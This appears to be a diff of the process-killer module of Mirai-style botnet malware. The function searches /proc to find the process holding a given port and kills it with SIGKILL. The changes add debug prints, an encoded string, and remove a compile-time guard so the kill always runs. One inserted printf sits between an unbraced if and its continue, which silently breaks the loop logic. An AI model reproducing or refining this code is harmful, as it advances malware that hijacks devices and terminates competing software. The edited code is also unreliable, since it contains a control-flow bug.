@@ -356,16 +356,22 @@ BOOL killer_kill_by_port(port_t port)
 
 #ifdef DEBUG
     printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
+    //char *result_temp="\x0D\x52\x50\x4D\x41\x0D\x22";
+    //printf("DEBUG|%s\n",result_temp);
 #endif
 
+    //if ((dir = opendir("\x0D\x52\x50\x4D\x41\x0D\x22")) != NULL)
     if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
     {
+        //printf("OK:if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)");
         while ((entry = readdir(dir)) != NULL && ret == 0)
         {
+            //printf("OK:while ((entry = readdir(dir)) != NULL && ret == 0)");
             char *pid = entry->d_name;
 
             // skip all folders that are not PIDs
             if (*pid < '0' || *pid > '9')
+            printf("OK:if (*pid < '0' || *pid > '9')");
                 continue;
 
             util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
@@ -373,6 +379,7 @@ BOOL killer_kill_by_port(port_t port)
             util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));
 
             if (readlink(path, exe, PATH_MAX) == -1)
+            //printf("OK:if (readlink(path, exe, PATH_MAX) == -1)");
                 continue;
 
             util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
@@ -380,8 +387,10 @@ BOOL killer_kill_by_port(port_t port)
             util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
             if ((fd_dir = opendir(path)) != NULL)
             {
+                //printf("OK:if ((fd_dir = opendir(path)) != NULL)");
                 while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                 {
+                    //printf("OK:while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)");
                     char *fd_str = fd_entry->d_name;
 
                     util_zero(exe, PATH_MAX);
@@ -391,15 +400,17 @@ BOOL killer_kill_by_port(port_t port)
                     util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                     util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                     if (readlink(path, exe, PATH_MAX) == -1)
+                    //printf("OK:if (readlink(path, exe, PATH_MAX) == -1)");
                         continue;
 
                     if (util_stristr(exe, util_strlen(exe), inode) != -1)
                     {
-#ifndef KILL_PORT
-                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
-#else
+//#ifndef KILL_PORT
+//                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
+//#else
+                        printf("aboutkill");
                         kill(util_atoi(pid, 10), 9);
-#endif
+//#endif
                         ret = 1;
                     }
                 }
@@ -407,6 +418,8 @@ BOOL killer_kill_by_port(port_t port)
             }
         }
         closedir(dir);
+    }else{
+        //perror("opendir");
     }
 
     sleep(1);
